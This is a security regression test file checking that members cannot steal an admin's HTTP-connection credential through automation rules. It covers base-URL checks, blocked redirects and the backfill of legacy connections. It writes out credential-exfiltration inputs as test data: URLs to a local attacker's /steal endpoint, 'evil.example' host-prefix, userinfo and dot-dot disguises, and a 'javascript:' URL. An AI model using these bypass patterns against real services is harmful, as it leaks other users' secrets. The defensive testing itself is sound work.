import { createServer } from 'node:http';
import type { IncomingMessage, Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest';
import type { NestFastifyApplication } from '@nestjs/platform-fastify';
import { createTestApp } from './helpers/app';
import { authed, signUpUser } from './helpers/users';
import { connectTestDb } from './helpers/db';
import { connections } from '../src/db/schema';
import { seal } from '../src/common/secretbox';
import { httpBaseUrlProblem, urlWithinBase } from '../src/connections/providers';
import { ConnectionsService } from '../src/connections/connections.service';

/**
 * #1035 — a member could steal an admin's HTTP-connection credential: members see connection ids, any member can author an
 * http_request rule, the rule's URL is the author's choice, and "Send test request" runs at once. The attack is run exactly like
 * that, against a REAL attacker server; the assertion is what the attacker's server received.
 */
const { db } = connectTestDb();
let app: NestFastifyApplication;
let admin: { token: string };
let member: { token: string };
let ws: string, dbId: string, recId: string;
let attacker: Server, attackerUrl: string;
let legit: Server, legitUrl: string;
let attackerSaw: Array<{ url?: string; auth?: string; key?: string }> = [];
let legitSaw: Array<{ url?: string; auth?: string }> = [];
const SECRET = 'admin-bearer-SECRET-12345';

const as = (token: string, method: string, url: string, payload?: unknown) =>
  app.inject({ method: method as never, url: `/api/v1${url}`, headers: authed(token), payload: payload as never });
const listen = (server: Server) => new Promise<string>((resolve) => server.listen(0, '127.0.0.1', () => resolve(`http://127.0.0.1:${(server.address() as AddressInfo).port}`)));

beforeAll(async () => {
  process.env.HTTP_ACTION_ALLOW_PRIVATE_CIDRS = '127.0.0.0/8'; // so the loopback servers are reachable: the BASE URL, not the SSRF guard, is what is under test
  app = await createTestApp();
  admin = await signUpUser(app, 'Conn Admin');
  const m = await signUpUser(app, 'Conn Member');
  member = m;
  ws = (await as(admin.token, 'POST', '/workspaces', { name: 'Conn WS' })).json().id;
  const invite = await as(admin.token, 'POST', `/workspaces/${ws}/invites`, { email: (m as { email: string }).email, role: 'member' });
  await as(member.token, 'POST', '/invites/accept', { token: new URL(invite.json().accept_url).searchParams.get('token')! });
  const space = (await as(admin.token, 'GET', `/workspaces/${ws}/spaces`)).json()[0].id;
  dbId = (await as(admin.token, 'POST', `/workspaces/${ws}/databases`, { space_id: space, name: 'Orders' })).json().id;
  recId = (await as(admin.token, 'POST', `/workspaces/${ws}/databases/${dbId}/records`, { values: { name: 'Acme' } })).json().id;
  attacker = createServer((req: IncomingMessage, res) => {
    attackerSaw.push({ url: req.url, auth: req.headers.authorization, key: req.headers['x-api-key'] as string | undefined });
    res.writeHead(200, { 'content-type': 'application/json' }); res.end('{"ok":true}');
  });
  legit = createServer((req: IncomingMessage, res) => {
    legitSaw.push({ url: req.url, auth: req.headers.authorization });
    if (req.url === '/v1/redirect-out') { res.writeHead(302, { location: `${attackerUrl}/collected` }); res.end(); return; }
    res.writeHead(200, { 'content-type': 'application/json' }); res.end('{"ok":true}');
  });
  attackerUrl = await listen(attacker);
  legitUrl = await listen(legit);
}, 120_000);
afterAll(async () => {
  delete process.env.HTTP_ACTION_ALLOW_PRIVATE_CIDRS;
  await new Promise((r) => attacker.close(r)); await new Promise((r) => legit.close(r));
  await app.close();
});
afterEach(() => { attackerSaw = []; legitSaw = []; });

const createConnection = async (auth: Record<string, unknown>) => {
  const res = await as(admin.token, 'POST', `/workspaces/${ws}/connections`, { provider: 'http', name: 'Admin API', auth });
  expect(res.statusCode, res.body).toBe(201);
  return res.json().id as string;
};
/** The member authors a rule against the admin's connection and clicks "Send test request" (the one click of the attack). */
async function memberSendsTest(connectionId: string, url: string) {
  const rule = await as(member.token, 'POST', `/workspaces/${ws}/databases/${dbId}/automations`, {
    name: `steal-${Math.random()}`,
    trigger: { type: 'record_created' },
    actions: [{ type: 'http_request', method: 'GET', url, connection_id: connectionId }],
  });
  expect(rule.statusCode, `the member CAN author the rule: ${rule.body}`).toBeLessThan(300);
  return as(member.token, 'POST', `/workspaces/${ws}/databases/${dbId}/automations/${rule.json().id}/test`, { record_id: recId, action_index: 0 });
}

describe('#1035 the attack: a member points an admin connection at their own server', () => {
  it('the attacker\'s server receives NOTHING, and the member gets a refusal that does not contain the secret', async () => {
    const id = await createConnection({ auth_style: 'bearer', token: SECRET, base_url: `${legitUrl}/v1` });
    // the member can see the connection id (this is how the attack starts)
    expect(JSON.stringify((await as(member.token, 'GET', `/workspaces/${ws}/connections`)).json())).toContain(id);
    const res = await memberSendsTest(id, `${attackerUrl}/steal`);
    expect(res.statusCode, res.body).toBe(422);
    expect(res.body).toContain('outside this connection');
    expect(res.body).not.toContain(SECRET);
    expect(attackerSaw, 'nothing reached the attacker').toEqual([]);
  });

  it('every disguise is refused too: a prefix host, userinfo, a different port, a path outside the prefix, a dot-dot walk', async () => {
    const id = await createConnection({ auth_style: 'bearer', token: SECRET, base_url: `${legitUrl}/v1` });
    const host = new URL(legitUrl).host;
    for (const url of [
      `http://${host}.evil.example/v1/x`, `http://${host}@${new URL(attackerUrl).host}/v1/x`, `${legitUrl.replace(/:\d+$/, ':1')}/v1/x`,
      `${legitUrl}/v10/x`, `${legitUrl}/admin`, `${legitUrl}/v1/../admin`, `${legitUrl}/v1/%2e%2e/admin`,
    ]) {
      const res = await memberSendsTest(id, url);
      expect(res.statusCode, `${url}: ${res.body}`).toBe(422);
    }
    expect(attackerSaw).toEqual([]);
    expect(legitSaw, 'and nothing was sent to the legitimate host outside its prefix either').toEqual([]);
  });

  it('a URL inside the base works: the credential reaches the admin-approved API, exactly as before', async () => {
    const id = await createConnection({ auth_style: 'bearer', token: SECRET, base_url: `${legitUrl}/v1` });
    const res = await memberSendsTest(id, `${legitUrl}/v1/orders?x=1`);
    expect(res.statusCode, res.body).toBeLessThan(300);
    expect(legitSaw).toEqual([{ url: '/v1/orders?x=1', auth: `Bearer ${SECRET}` }]);
  });

  it('a REDIRECT from the approved API to the attacker does not carry the credential', async () => {
    const id = await createConnection({ auth_style: 'headers', headers: { 'X-Api-Key': SECRET }, base_url: `${legitUrl}/v1` });
    const res = await memberSendsTest(id, `${legitUrl}/v1/redirect-out`);
    expect(res.statusCode, res.body).toBeLessThan(300);
    expect(attackerSaw, 'the attacker was reached by the redirect...').toHaveLength(1);
    expect(attackerSaw[0]!.key, '...but without the credential').toBeUndefined();
    expect(attackerSaw[0]!.auth).toBeUndefined();
  });

  it('a connection made BEFORE this existed (no base URL) sends nothing anywhere until an admin sets one; setting one makes it work', async () => {
    // exactly what an old row looks like: a sealed auth blob with no base_url
    const [row] = await db.insert(connections).values({ workspaceId: ws, provider: 'http', name: 'Legacy', authSealed: seal(JSON.stringify({ auth_style: 'bearer', token: SECRET })), scopes: [], status: 'active', lastOkAt: new Date() }).returning();
    const listed = ((await as(admin.token, 'GET', `/workspaces/${ws}/connections`)).json().data as Array<{ id: string; base_url?: string | null; needs_base_url?: boolean }>).find((c) => c.id === row!.id)!;
    expect(listed).toMatchObject({ base_url: null, needs_base_url: true });
    expect(JSON.stringify(listed), 'the list never carries the credential').not.toContain(SECRET);

    const refused = await memberSendsTest(row!.id, `${legitUrl}/v1/x`);
    expect(refused.statusCode).toBe(422);
    expect(refused.body).toContain("Set this connection's base URL");
    expect(legitSaw).toEqual([]);

    expect((await as(member.token, 'PATCH', `/workspaces/${ws}/connections/${row!.id}`, { base_url: `${legitUrl}/v1` })).statusCode, 'only an admin sets it').toBe(403);
    const set = await as(admin.token, 'PATCH', `/workspaces/${ws}/connections/${row!.id}`, { base_url: `${legitUrl}/v1` });
    expect(set.statusCode, set.body).toBe(200);
    expect(set.json()).toMatchObject({ base_url: `${legitUrl}/v1`, needs_base_url: false });
    expect((await memberSendsTest(row!.id, `${legitUrl}/v1/x`)).statusCode).toBeLessThan(300);
    expect(legitSaw[0]!.auth).toBe(`Bearer ${SECRET}`);
  });
});

describe('#1035 base URL validation', () => {
  it('a new HTTP connection REQUIRES a valid base URL (422), and an admin cannot set a bad one', async () => {
    for (const auth of [{ auth_style: 'bearer', token: 't' }, { auth_style: 'bearer', token: 't', base_url: 'not a url' }, { auth_style: 'bearer', token: 't', base_url: 'ftp://x.example' }, { auth_style: 'bearer', token: 't', base_url: 'https://u:p@x.example' }, { auth_style: 'bearer', token: 't', base_url: 'https://x.example/?q=1' }]) {
      const res = await as(admin.token, 'POST', `/workspaces/${ws}/connections`, { provider: 'http', name: 'bad', auth });
      expect(res.statusCode, JSON.stringify(auth)).toBe(422);
    }
    const id = await createConnection({ auth_style: 'bearer', token: 't', base_url: 'https://api.example.com' });
    expect((await as(admin.token, 'PATCH', `/workspaces/${ws}/connections/${id}`, { base_url: 'javascript:alert(1)' })).statusCode).toBe(422);
  });

  it('httpBaseUrlProblem / urlWithinBase (pure)', () => {
    expect(httpBaseUrlProblem('https://api.example.com/v1')).toBeNull();
    expect(httpBaseUrlProblem('http://intranet.local:8080')).toBeNull();
    for (const bad of [undefined, '', 'x', 'file:///etc', 'https://a:b@h.example', 'https://h.example#f', 'https://h.example?q=1']) expect(httpBaseUrlProblem(bad), String(bad)).not.toBeNull();
    expect(urlWithinBase('https://api.example.com/v1', 'https://api.example.com/v1')).toBe(true);
    expect(urlWithinBase('https://api.example.com/v1/a/b?x=1#h', 'https://api.example.com/v1')).toBe(true);
    expect(urlWithinBase('https://api.example.com/anything', 'https://api.example.com')).toBe(true);
    for (const out of ['https://api.example.com/v10', 'https://api.example.com/v1/../x', 'https://API.example.com.evil/v1', 'http://api.example.com/v1', 'https://api.example.com:444/v1', 'https://x@api.example.com/v1', 'nope']) expect(urlWithinBase(out, 'https://api.example.com/v1'), out).toBe(false);
  });
});


/**
 * Otto's ruling on #1035: breaking every existing connection silently is not acceptable. A connection made before base_url existed
 * gets it from where its OWN rules already send it, but only when that is unambiguous; the rest are flagged and their runs fail loudly.
 */
describe('#1035 existing connections: backfilled when unambiguous, otherwise flagged', () => {
  const legacy = async (name: string, withBase?: string) => {
    const auth = { auth_style: 'bearer', token: SECRET, ...(withBase ? { base_url: withBase } : {}) };
    const [row] = await db.insert(connections).values({ workspaceId: ws, provider: 'http', name, authSealed: seal(JSON.stringify(auth)), scopes: [], status: 'active', lastOkAt: new Date() }).returning();
    return row!.id;
  };
  const ruleUsing = async (connectionId: string, url: string) => {
    const res = await as(admin.token, 'POST', `/workspaces/${ws}/databases/${dbId}/automations`, { name: `rule-${Math.random()}`, trigger: { type: 'record_created' }, actions: [{ type: 'http_request', method: 'GET', url, connection_id: connectionId }] });
    expect(res.statusCode, res.body).toBeLessThan(300);
  };
  const summary = async (id: string) => ((await as(admin.token, 'GET', `/workspaces/${ws}/connections`)).json().data as Array<{ id: string; base_url?: string | null; needs_base_url?: boolean }>).find((c) => c.id === id)!;
  const run = () => app.get(ConnectionsService).backfillHttpBaseUrls();

  it('one origin across all the rules that use it: the base URL becomes that origin, and the connection then works', async () => {
    const id = await legacy('One origin');
    await ruleUsing(id, `${legitUrl}/v1/orders`);
    await ruleUsing(id, `${legitUrl}/v2/customers?x=1`);
    await run();
    expect(await summary(id)).toMatchObject({ base_url: legitUrl, needs_base_url: false });
    expect((await memberSendsTest(id, `${legitUrl}/v1/orders`)).statusCode).toBeLessThan(300);
    expect((await memberSendsTest(id, `${attackerUrl}/steal`)).statusCode, 'and the attacker is still refused').toBe(422);
  });

  it('rules pointing at SEVERAL origins, a templated host, or none at all: left without one and flagged, never guessed', async () => {
    const two = await legacy('Two origins');
    await ruleUsing(two, `${legitUrl}/v1/a`);
    await ruleUsing(two, `${attackerUrl}/b`);
    const templated = await legacy('Templated host');
    await ruleUsing(templated, 'https://{Name}.example.com/x');
    const unused = await legacy('Unused');
    const result = await run();
    expect(result.ambiguous).toBeGreaterThanOrEqual(2);
    expect(result.unused).toBeGreaterThanOrEqual(1);
    for (const id of [two, templated, unused]) expect(await summary(id), id).toMatchObject({ base_url: null, needs_base_url: true });
  });

  it('a connection that already has a base URL is never overwritten, and a second run changes nothing (idempotent)', async () => {
    const id = await legacy('Has one', 'https://chosen.example.com/api');
    await ruleUsing(id, `${legitUrl}/v1/x`);
    await run();
    expect(await summary(id)).toMatchObject({ base_url: 'https://chosen.example.com/api' });
    const again = await run();
    expect(again.set, 'nothing left to backfill').toBe(0);
  });

  it('a connection used only in ANOTHER workspace\'s rules is not given that workspace\'s origin', async () => {
    const id = await legacy('Other workspace rule');
    const other = (await as(admin.token, 'POST', '/workspaces', { name: 'Elsewhere' })).json().id as string;
    const space = (await as(admin.token, 'GET', `/workspaces/${other}/spaces`)).json()[0].id;
    const otherDb = (await as(admin.token, 'POST', `/workspaces/${other}/databases`, { space_id: space, name: 'Elsewhere DB' })).json().id as string;
    // a rule over there can't even reference this connection (validated per workspace), so write it the way old data could be: directly
    const { automations } = await import('../src/db/schema');
    await db.insert(automations).values({ databaseId: otherDb, name: 'foreign', trigger: { type: 'record_created' }, actions: [{ type: 'http_request', method: 'GET', url: `${attackerUrl}/x`, connection_id: id }] as never });
    await run();
    expect(await summary(id), 'rules in another workspace say nothing about this connection').toMatchObject({ base_url: null, needs_base_url: true });
  });
});
